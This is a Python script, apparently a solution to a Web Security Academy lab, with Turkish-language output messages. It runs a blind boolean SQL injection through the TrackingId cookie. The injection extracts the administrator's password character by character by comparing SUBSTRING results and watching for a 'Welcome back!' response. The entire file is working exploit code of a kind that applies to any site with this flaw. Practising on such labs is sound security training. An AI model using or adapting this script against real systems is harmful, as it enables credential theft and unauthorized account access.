import requests
import string
import time

url = "https://0aaa00e704c120b6a3f6eaf500460089.web-security-academy.net/login"
cookies = {
    'session': 'rB3nTxpTouENNHyyfVUPZHlncgrQgtR5',  # kendi session ID'n
}
headers = {
    'User-Agent': 'Mozilla/5.0',
}

base_tracking_id = 'EXSywlLdxKEBR0RY'
charset = string.ascii_lowercase + string.digits
max_length = 30
found_password = ""

print("\n[*] Parola çözülüyor...\n")
start = time.time()

for pos in range(1, max_length + 1):
    for c in charset:
        cookies['TrackingId'] = f"{base_tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{c}'--"
        r = requests.get(url, headers=headers, cookies=cookies)
        if "Welcome back!" in r.text:
            found_password += c
            print(f"[+] {pos}. karakter: '{c}' -> {found_password}")
            break
    else:
        print(f"[-] {pos}. karakter bulunamadı. Parola bitti mi?")
        break

print(f"\n[✔] Tam parola: {found_password}")
print(f"[⏱️] Süre: {time.time()-start:.2f} saniye")
